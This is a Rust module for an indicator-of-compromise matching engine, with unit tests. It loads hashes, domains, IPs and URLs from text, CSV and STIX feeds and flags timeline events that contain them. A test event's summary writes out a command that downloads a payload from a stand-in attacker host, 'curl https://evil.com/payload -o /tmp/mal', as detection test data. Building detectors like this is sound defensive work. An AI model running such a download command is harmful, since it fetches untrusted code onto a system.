//! IOC (Indicator of Compromise) matching engine.
//!
//! Supports loading IOCs from plain-text files, CSV feeds, and STIX 2.1 JSON
//! bundles, then matching them against [`TimelineEvent`]s.

use std::collections::HashMap;
use std::path::Path;

use hunt_query::timeline::TimelineEvent;
use serde::{Deserialize, Serialize};

use crate::error::{Error, Result};

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/// Classification of an indicator of compromise.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum IocType {
    Sha256,
    Sha1,
    Md5,
    Domain,
    #[serde(rename = "ipv4")]
    IPv4,
    #[serde(rename = "ipv6")]
    IPv6,
    Url,
}

/// A single IOC entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IocEntry {
    /// The indicator value (hash, domain, IP, URL).
    pub indicator: String,
    /// Detected or declared type.
    pub ioc_type: IocType,
    /// Human-readable description.
    pub description: Option<String>,
    /// Attribution source (feed name, report URL, etc.).
    pub source: Option<String>,
}

/// A match between a timeline event and one or more IOC entries.
#[derive(Debug, Clone, Serialize)]
pub struct IocMatch {
    /// The event that matched.
    pub event: TimelineEvent,
    /// All IOC entries that matched this event.
    pub matched_iocs: Vec<IocEntry>,
    /// Which event field produced the match (e.g. `"summary"`, `"process"`, `"raw"`).
    pub match_field: String,
}

/// In-memory IOC database with index structures for fast lookup.
#[derive(Debug)]
pub struct IocDatabase {
    entries: Vec<IocEntry>,
    /// lowercase hash string -> indices into `entries`
    hash_index: HashMap<String, Vec<usize>>,
    /// lowercase domain -> indices into `entries`
    domain_index: HashMap<String, Vec<usize>>,
    /// IP string -> indices into `entries`
    ip_index: HashMap<String, Vec<usize>>,
    /// lowercase URL string -> indices into `entries`
    url_index: HashMap<String, Vec<usize>>,
}

// ---------------------------------------------------------------------------
// Auto-detection
// ---------------------------------------------------------------------------

/// Auto-detect the IOC type from the indicator string format.
///
/// - 64 hex chars → SHA-256
/// - 40 hex chars → SHA-1
/// - 32 hex chars → MD5
/// - starts with `http://` or `https://` → URL
/// - matches `x.x.x.x` where each octet is 0-255 → IPv4
/// - contains `:` and hex digits → IPv6
/// - contains `.` (and nothing else matched) → Domain
pub fn detect_ioc_type(indicator: &str) -> Option<IocType> {
    let trimmed = indicator.trim();
    if trimmed.is_empty() {
        return None;
    }

    // Check for hex-only hashes (SHA-256, SHA-1, MD5)
    let lower = trimmed.to_lowercase();

    if lower.len() == 64 && lower.chars().all(|c| c.is_ascii_hexdigit()) {
        return Some(IocType::Sha256);
    }
    if lower.len() == 40 && lower.chars().all(|c| c.is_ascii_hexdigit()) {
        return Some(IocType::Sha1);
    }
    if lower.len() == 32 && lower.chars().all(|c| c.is_ascii_hexdigit()) {
        return Some(IocType::Md5);
    }

    // URL
    if lower.starts_with("http://") || lower.starts_with("https://") {
        return Some(IocType::Url);
    }

    // IPv4: exactly 4 dot-separated octets, each 0-255
    if is_ipv4(trimmed) {
        return Some(IocType::IPv4);
    }

    // IPv6: contains colons and hex digits (simplified heuristic)
    if trimmed.contains(':') && trimmed.chars().all(|c| c.is_ascii_hexdigit() || c == ':') {
        return Some(IocType::IPv6);
    }

    // Domain: contains at least one dot, no spaces, no slashes
    if trimmed.contains('.')
        && !trimmed.contains(' ')
        && !trimmed.contains('/')
        && !trimmed.contains(':')
    {
        return Some(IocType::Domain);
    }

    None
}

fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    parts.iter().all(|p| {
        if p.is_empty() {
            return false;
        }
        match p.parse::<u16>() {
            Ok(n) => n <= 255,
            Err(_) => false,
        }
    })
}

// ---------------------------------------------------------------------------
// IocDatabase
// ---------------------------------------------------------------------------

impl IocDatabase {
    /// Create an empty IOC database.
    pub fn new() -> Self {
        Self {
            entries: Vec::new(),
            hash_index: HashMap::new(),
            domain_index: HashMap::new(),
            ip_index: HashMap::new(),
            url_index: HashMap::new(),
        }
    }

    /// Add a single entry and update indices.
    pub fn add_entry(&mut self, entry: IocEntry) {
        let idx = self.entries.len();
        let key = entry.indicator.to_lowercase();
        match entry.ioc_type {
            IocType::Sha256 | IocType::Sha1 | IocType::Md5 => {
                self.hash_index.entry(key).or_default().push(idx);
            }
            IocType::Domain => {
                self.domain_index.entry(key).or_default().push(idx);
            }
            IocType::IPv4 | IocType::IPv6 => {
                self.ip_index.entry(key).or_default().push(idx);
            }
            IocType::Url => {
                self.url_index.entry(key).or_default().push(idx);
            }
        }
        self.entries.push(entry);
    }

    /// Number of loaded entries.
    pub fn len(&self) -> usize {
        self.entries.len()
    }

    /// Whether the database is empty.
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// Merge another database into this one.
    pub fn merge(&mut self, other: IocDatabase) {
        for entry in other.entries {
            self.add_entry(entry);
        }
    }

    // -- Loaders -----------------------------------------------------------

    /// Load IOCs from a plain-text file (one indicator per line).
    ///
    /// Empty lines and lines starting with `#` are skipped. Type is
    /// auto-detected via [`detect_ioc_type`].
    pub fn load_text_file(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)?;
        let mut db = Self::new();
        for line in content.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            if let Some(ioc_type) = detect_ioc_type(trimmed) {
                db.add_entry(IocEntry {
                    indicator: trimmed.to_string(),
                    ioc_type,
                    description: None,
                    source: None,
                });
            }
        }
        Ok(db)
    }

    /// Load IOCs from a CSV file.
    ///
    /// Expected columns: `indicator, type, description, source`.
    /// The first row is treated as a header if it starts with `indicator`
    /// (case-insensitive). Quoted fields are supported (double-quote).
    pub fn load_csv_file(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)?;
        let mut db = Self::new();
        let mut lines = content.lines();

        // Skip header if present
        if let Some(first) = lines.next() {
            let first_lower = first.trim().to_lowercase();
            if !first_lower.starts_with("indicator") {
                // Not a header — process it as data
                if let Some(entry) = parse_csv_line(first) {
                    db.add_entry(entry);
                }
            }
        }

        for line in lines {
            if line.trim().is_empty() {
                continue;
            }
            if let Some(entry) = parse_csv_line(line) {
                db.add_entry(entry);
            }
        }
        Ok(db)
    }

    /// Load IOCs from a STIX 2.1 JSON bundle.
    ///
    /// Only `type: "indicator"` SDOs are extracted. Only simple equality
    /// patterns of the form `[TYPE:PROPERTY = 'VALUE']` are supported.
    pub fn load_stix_bundle(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)?;
        let bundle: serde_json::Value =
            serde_json::from_str(&content).map_err(|e| Error::IocParse(e.to_string()))?;

        let mut db = Self::new();

        let objects = bundle
            .get("objects")
            .and_then(|v| v.as_array())
            .ok_or_else(|| Error::IocParse("STIX bundle missing 'objects' array".into()))?;

        for obj in objects {
            let sdo_type = obj.get("type").and_then(|v| v.as_str()).unwrap_or("");
            if sdo_type != "indicator" {
                continue;
            }

            let pattern = match obj.get("pattern").and_then(|v| v.as_str()) {
                Some(p) => p,
                None => continue,
            };

            let description = obj
                .get("description")
                .and_then(|v| v.as_str())
                .map(String::from);
            let source = obj.get("name").and_then(|v| v.as_str()).map(String::from);

            if let Some((indicator, ioc_type)) = parse_stix_pattern(pattern) {
                db.add_entry(IocEntry {
                    indicator,
                    ioc_type,
                    description,
                    source,
                });
            }
        }

        Ok(db)
    }
}

impl Default for IocDatabase {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// CSV parsing helpers
// ---------------------------------------------------------------------------

/// Parse a single CSV line into fields, handling double-quoted values.
fn split_csv_fields(line: &str) -> Vec<String> {
    let mut fields = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    let mut chars = line.chars().peekable();

    while let Some(ch) = chars.next() {
        if in_quotes {
            if ch == '"' {
                // Check for escaped quote ("")
                if chars.peek() == Some(&'"') {
                    current.push('"');
                    chars.next();
                } else {
                    in_quotes = false;
                }
            } else {
                current.push(ch);
            }
        } else if ch == '"' {
            in_quotes = true;
        } else if ch == ',' {
            fields.push(current.trim().to_string());
            current = String::new();
        } else {
            current.push(ch);
        }
    }
    fields.push(current.trim().to_string());
    fields
}

fn parse_csv_line(line: &str) -> Option<IocEntry> {
    let fields = split_csv_fields(line);
    if fields.is_empty() {
        return None;
    }

    let indicator = fields.first()?.trim().to_string();
    if indicator.is_empty() {
        return None;
    }

    let ioc_type = if fields.len() > 1 && !fields[1].is_empty() {
        parse_ioc_type_str(&fields[1])?
    } else {
        detect_ioc_type(&indicator)?
    };

    let description = fields
        .get(2)
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string());
    let source = fields
        .get(3)
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string());

    Some(IocEntry {
        indicator,
        ioc_type,
        description,
        source,
    })
}

fn parse_ioc_type_str(s: &str) -> Option<IocType> {
    match s.trim().to_lowercase().as_str() {
        "sha256" | "sha-256" => Some(IocType::Sha256),
        "sha1" | "sha-1" => Some(IocType::Sha1),
        "md5" => Some(IocType::Md5),
        "domain" | "domain-name" => Some(IocType::Domain),
        "ipv4" | "ipv4-addr" | "ip" => Some(IocType::IPv4),
        "ipv6" | "ipv6-addr" => Some(IocType::IPv6),
        "url" => Some(IocType::Url),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// STIX pattern parsing
// ---------------------------------------------------------------------------

/// Parse a simple STIX 2.1 pattern of the form `[TYPE:PROPERTY = 'VALUE']`.
///
/// Returns `(value, IocType)` on success.
fn parse_stix_pattern(pattern: &str) -> Option<(String, IocType)> {
    let trimmed = pattern.trim();

    // Strip surrounding brackets
    let inner = trimmed.strip_prefix('[')?.strip_suffix(']')?;

    // Split on " = " (STIX uses single space around =)
    let (lhs, rhs) = inner.split_once('=')?;
    let lhs = lhs.trim();
    let rhs = rhs.trim();

    // Extract value from single quotes
    let value = rhs.strip_prefix('\'')?.strip_suffix('\'')?;
    if value.is_empty() {
        return None;
    }

    // Map STIX object type to IocType
    let ioc_type = stix_lhs_to_ioc_type(lhs)?;

    Some((value.to_string(), ioc_type))
}

fn stix_lhs_to_ioc_type(lhs: &str) -> Option<IocType> {
    let lower = lhs.to_lowercase();
    if lower.contains("sha-256") || lower.contains("sha256") {
        Some(IocType::Sha256)
    } else if lower.contains("sha-1") || lower.contains("sha1") {
        Some(IocType::Sha1)
    } else if lower.contains("md5") {
        Some(IocType::Md5)
    } else if lower.starts_with("domain-name") {
        Some(IocType::Domain)
    } else if lower.starts_with("ipv4-addr") {
        Some(IocType::IPv4)
    } else if lower.starts_with("ipv6-addr") {
        Some(IocType::IPv6)
    } else if lower.starts_with("url") {
        Some(IocType::Url)
    } else {
        None
    }
}

// ---------------------------------------------------------------------------
// Matching
// ---------------------------------------------------------------------------

/// Check a single timeline event against the IOC database.
///
/// Fields checked: `summary`, `process`, and `raw` JSON (serialised to string).
/// Hash IOCs require exact substring match; domain and IP IOCs check for
/// substring presence.
pub fn match_event(db: &IocDatabase, event: &TimelineEvent) -> Vec<IocMatch> {
    let mut matches: Vec<IocMatch> = Vec::new();

    let summary_lower = event.summary.to_lowercase();
    let process_lower = event.process.as_deref().unwrap_or("").to_lowercase();
    let raw_str = event
        .raw
        .as_ref()
        .map(|v| v.to_string().to_lowercase())
        .unwrap_or_default();

    // Check hashes (exact match in any text field)
    for (hash, indices) in &db.hash_index {
        let mut field = None;
        if summary_lower.contains(hash.as_str()) {
            field = Some("summary");
        } else if process_lower.contains(hash.as_str()) {
            field = Some("process");
        } else if raw_str.contains(hash.as_str()) {
            field = Some("raw");
        }
        if let Some(f) = field {
            let matched_iocs: Vec<IocEntry> =
                indices.iter().map(|&i| db.entries[i].clone()).collect();
            matches.push(IocMatch {
                event: event.clone(),
                matched_iocs,
                match_field: f.to_string(),
            });
        }
    }

    // Check domains (substring)
    for (domain, indices) in &db.domain_index {
        let mut field = None;
        if summary_lower.contains(domain.as_str()) {
            field = Some("summary");
        } else if process_lower.contains(domain.as_str()) {
            field = Some("process");
        } else if raw_str.contains(domain.as_str()) {
            field = Some("raw");
        }
        if let Some(f) = field {
            let matched_iocs: Vec<IocEntry> =
                indices.iter().map(|&i| db.entries[i].clone()).collect();
            matches.push(IocMatch {
                event: event.clone(),
                matched_iocs,
                match_field: f.to_string(),
            });
        }
    }

    // Check IPs (substring)
    for (ip, indices) in &db.ip_index {
        let mut field = None;
        if summary_lower.contains(ip.as_str()) {
            field = Some("summary");
        } else if process_lower.contains(ip.as_str()) {
            field = Some("process");
        } else if raw_str.contains(ip.as_str()) {
            field = Some("raw");
        }
        if let Some(f) = field {
            let matched_iocs: Vec<IocEntry> =
                indices.iter().map(|&i| db.entries[i].clone()).collect();
            matches.push(IocMatch {
                event: event.clone(),
                matched_iocs,
                match_field: f.to_string(),
            });
        }
    }

    // Check URLs (substring)
    for (url, indices) in &db.url_index {
        let mut field = None;
        if summary_lower.contains(url.as_str()) {
            field = Some("summary");
        } else if process_lower.contains(url.as_str()) {
            field = Some("process");
        } else if raw_str.contains(url.as_str()) {
            field = Some("raw");
        }
        if let Some(f) = field {
            let matched_iocs: Vec<IocEntry> =
                indices.iter().map(|&i| db.entries[i].clone()).collect();
            matches.push(IocMatch {
                event: event.clone(),
                matched_iocs,
                match_field: f.to_string(),
            });
        }
    }

    matches
}

/// Batch-match a slice of timeline events against the IOC database.
pub fn match_events(db: &IocDatabase, events: &[TimelineEvent]) -> Vec<IocMatch> {
    events.iter().flat_map(|e| match_event(db, e)).collect()
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::{TimeZone, Utc};
    use hunt_query::query::EventSource;
    use hunt_query::timeline::{NormalizedVerdict, TimelineEventKind};
    use std::io::Write;

    fn make_event(
        summary: &str,
        process: Option<&str>,
        raw: Option<serde_json::Value>,
    ) -> TimelineEvent {
        TimelineEvent {
            timestamp: Utc.with_ymd_and_hms(2025, 6, 15, 12, 0, 0).unwrap(),
            source: EventSource::Tetragon,
            kind: TimelineEventKind::ProcessExec,
            verdict: NormalizedVerdict::None,
            severity: None,
            summary: summary.to_string(),
            process: process.map(String::from),
            namespace: None,
            pod: None,
            action_type: None,
            signature_valid: None,
            raw,
        }
    }

    // -- detect_ioc_type ---------------------------------------------------

    #[test]
    fn detect_sha256() {
        let hash = "a".repeat(64);
        assert_eq!(detect_ioc_type(&hash), Some(IocType::Sha256));
    }

    #[test]
    fn detect_sha1() {
        let hash = "b".repeat(40);
        assert_eq!(detect_ioc_type(&hash), Some(IocType::Sha1));
    }

    #[test]
    fn detect_md5() {
        let hash = "c".repeat(32);
        assert_eq!(detect_ioc_type(&hash), Some(IocType::Md5));
    }

    #[test]
    fn detect_domain() {
        assert_eq!(detect_ioc_type("evil.com"), Some(IocType::Domain));
        assert_eq!(detect_ioc_type("sub.evil.com"), Some(IocType::Domain));
    }

    #[test]
    fn detect_ipv4() {
        assert_eq!(detect_ioc_type("192.168.1.1"), Some(IocType::IPv4));
        assert_eq!(detect_ioc_type("10.0.0.1"), Some(IocType::IPv4));
    }

    #[test]
    fn detect_ipv6() {
        assert_eq!(
            detect_ioc_type("2001:0db8:85a3:0000:0000:8a2e:0370:7334"),
            Some(IocType::IPv6)
        );
    }

    #[test]
    fn detect_url() {
        assert_eq!(
            detect_ioc_type("http://evil.com/payload"),
            Some(IocType::Url)
        );
        assert_eq!(
            detect_ioc_type("https://malware.example.org/dl"),
            Some(IocType::Url)
        );
    }

    #[test]
    fn detect_empty_returns_none() {
        assert_eq!(detect_ioc_type(""), None);
        assert_eq!(detect_ioc_type("   "), None);
    }

    // -- load_text_file ----------------------------------------------------

    #[test]
    fn load_text_file_parses_indicators() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs.txt");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "# comment line").unwrap();
            writeln!(f, "{}", "a".repeat(64)).unwrap();
            writeln!(f).unwrap(); // blank line
            writeln!(f, "evil.com").unwrap();
            writeln!(f, "192.168.1.1").unwrap();
        }

        let db = IocDatabase::load_text_file(&path).unwrap();
        assert_eq!(db.len(), 3);
        assert_eq!(db.entries[0].ioc_type, IocType::Sha256);
        assert_eq!(db.entries[1].ioc_type, IocType::Domain);
        assert_eq!(db.entries[2].ioc_type, IocType::IPv4);
    }

    // -- load_csv_file -----------------------------------------------------

    #[test]
    fn load_csv_file_with_header() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "indicator,type,description,source").unwrap();
            writeln!(f, "{},sha256,Bad file,ThreatFeed", "a".repeat(64)).unwrap();
            writeln!(f, "evil.com,domain,C2 domain,Intel").unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(db.len(), 2);
        assert_eq!(db.entries[0].ioc_type, IocType::Sha256);
        assert_eq!(db.entries[0].description.as_deref(), Some("Bad file"));
        assert_eq!(db.entries[0].source.as_deref(), Some("ThreatFeed"));
        assert_eq!(db.entries[1].ioc_type, IocType::Domain);
    }

    #[test]
    fn load_csv_file_quoted_fields() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs_quoted.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "indicator,type,description,source").unwrap();
            writeln!(f, r#""evil.com",domain,"Known C2, very bad","Intel, Inc""#).unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(db.len(), 1);
        assert_eq!(db.entries[0].indicator, "evil.com");
        assert_eq!(
            db.entries[0].description.as_deref(),
            Some("Known C2, very bad")
        );
        assert_eq!(db.entries[0].source.as_deref(), Some("Intel, Inc"));
    }

    // -- load_stix_bundle --------------------------------------------------

    #[test]
    fn load_stix_bundle_extracts_indicators() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("stix.json");
        let sha = "a".repeat(64);
        let bundle = serde_json::json!({
            "type": "bundle",
            "id": "bundle--1",
            "objects": [
                {
                    "type": "indicator",
                    "id": "indicator--1",
                    "name": "Malware hash",
                    "description": "Known bad hash",
                    "pattern": format!("[file:hashes.SHA-256 = '{}']", sha),
                    "pattern_type": "stix",
                    "valid_from": "2025-01-01T00:00:00Z"
                },
                {
                    "type": "indicator",
                    "id": "indicator--2",
                    "name": "C2 domain",
                    "pattern": "[domain-name:value = 'evil.example.com']",
                    "pattern_type": "stix",
                    "valid_from": "2025-01-01T00:00:00Z"
                },
                {
                    "type": "indicator",
                    "id": "indicator--3",
                    "name": "C2 IP",
                    "pattern": "[ipv4-addr:value = '10.0.0.99']",
                    "pattern_type": "stix",
                    "valid_from": "2025-01-01T00:00:00Z"
                },
                {
                    "type": "malware",
                    "id": "malware--1",
                    "name": "Should be skipped"
                }
            ]
        });
        std::fs::write(&path, serde_json::to_string(&bundle).unwrap()).unwrap();

        let db = IocDatabase::load_stix_bundle(&path).unwrap();
        assert_eq!(db.len(), 3);
        assert_eq!(db.entries[0].ioc_type, IocType::Sha256);
        assert_eq!(db.entries[0].indicator, sha);
        assert_eq!(db.entries[0].description.as_deref(), Some("Known bad hash"));
        assert_eq!(db.entries[0].source.as_deref(), Some("Malware hash"));
        assert_eq!(db.entries[1].ioc_type, IocType::Domain);
        assert_eq!(db.entries[1].indicator, "evil.example.com");
        assert_eq!(db.entries[2].ioc_type, IocType::IPv4);
        assert_eq!(db.entries[2].indicator, "10.0.0.99");
    }

    #[test]
    fn load_stix_bundle_missing_objects_errors() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad_stix.json");
        std::fs::write(&path, r#"{"type": "bundle"}"#).unwrap();

        let err = IocDatabase::load_stix_bundle(&path).unwrap_err();
        assert!(err.to_string().contains("objects"));
    }

    // -- match_event -------------------------------------------------------

    #[test]
    fn match_event_finds_hash_in_raw() {
        let sha = "a".repeat(64);
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: sha.clone(),
            ioc_type: IocType::Sha256,
            description: Some("bad hash".into()),
            source: None,
        });

        let event = make_event(
            "process_exec /usr/bin/curl",
            Some("/usr/bin/curl"),
            Some(serde_json::json!({"file_hash": sha})),
        );

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "raw");
        assert_eq!(results[0].matched_iocs.len(), 1);
        assert_eq!(results[0].matched_iocs[0].indicator, sha);
    }

    #[test]
    fn match_event_finds_domain_in_summary() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let event = make_event("egress TCP 10.0.0.1 -> evil.com:443", None, None);

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "summary");
    }

    #[test]
    fn match_event_finds_ip_in_summary() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "10.0.0.99".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });

        let event = make_event("egress TCP -> 10.0.0.99:8080", None, None);

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "summary");
    }

    #[test]
    fn match_event_no_match_returns_empty() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let event = make_event("normal activity on good.com", None, None);
        let results = match_event(&db, &event);
        assert!(results.is_empty());
    }

    // -- match_events (batch) ----------------------------------------------

    #[test]
    fn match_events_batch() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let events = vec![
            make_event("connection to evil.com", None, None),
            make_event("normal traffic", None, None),
            make_event("dns query evil.com", None, None),
        ];

        let results = match_events(&db, &events);
        assert_eq!(results.len(), 2);
    }

    // -- merge -------------------------------------------------------------

    #[test]
    fn merge_combines_databases() {
        let mut db1 = IocDatabase::new();
        db1.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let mut db2 = IocDatabase::new();
        db2.add_entry(IocEntry {
            indicator: "10.0.0.99".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });
        db2.add_entry(IocEntry {
            indicator: "a".repeat(64),
            ioc_type: IocType::Sha256,
            description: None,
            source: None,
        });

        db1.merge(db2);
        assert_eq!(db1.len(), 3);
        assert_eq!(db1.domain_index.len(), 1);
        assert_eq!(db1.ip_index.len(), 1);
        assert_eq!(db1.hash_index.len(), 1);
    }

    // -- STIX pattern parsing edge cases -----------------------------------

    #[test]
    fn stix_pattern_sha1() {
        let (val, typ) = parse_stix_pattern("[file:hashes.SHA-1 = 'abc123']").unwrap();
        assert_eq!(val, "abc123");
        assert_eq!(typ, IocType::Sha1);
    }

    #[test]
    fn stix_pattern_md5() {
        let (val, typ) = parse_stix_pattern("[file:hashes.MD5 = 'deadbeef']").unwrap();
        assert_eq!(val, "deadbeef");
        assert_eq!(typ, IocType::Md5);
    }

    #[test]
    fn stix_pattern_url() {
        let (val, typ) = parse_stix_pattern("[url:value = 'http://evil.com/payload']").unwrap();
        assert_eq!(val, "http://evil.com/payload");
        assert_eq!(typ, IocType::Url);
    }

    #[test]
    fn stix_pattern_invalid_returns_none() {
        assert!(parse_stix_pattern("not a valid pattern").is_none());
        assert!(parse_stix_pattern("[unknown:value = 'foo']").is_none());
        assert!(parse_stix_pattern("[]").is_none());
    }

    // -- CSV edge cases ----------------------------------------------------

    #[test]
    fn csv_split_handles_escaped_quotes() {
        let fields = split_csv_fields(r#""hello ""world""",value2"#);
        assert_eq!(fields.len(), 2);
        assert_eq!(fields[0], r#"hello "world""#);
        assert_eq!(fields[1], "value2");
    }

    // -- IocDatabase::add_entry and indexing --------------------------------

    #[test]
    fn add_entry_indexes_url() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "https://evil.com/payload".into(),
            ioc_type: IocType::Url,
            description: None,
            source: None,
        });
        assert_eq!(db.url_index.len(), 1);
        assert_eq!(db.hash_index.len(), 0);
        assert_eq!(db.domain_index.len(), 0);
        assert_eq!(db.ip_index.len(), 0);
    }

    #[test]
    fn match_event_finds_url_in_summary() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "https://evil.com/payload".into(),
            ioc_type: IocType::Url,
            description: None,
            source: None,
        });

        let event = make_event(
            "curl https://evil.com/payload -o /tmp/mal",
            Some("curl"),
            None,
        );

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "summary");
    }
}
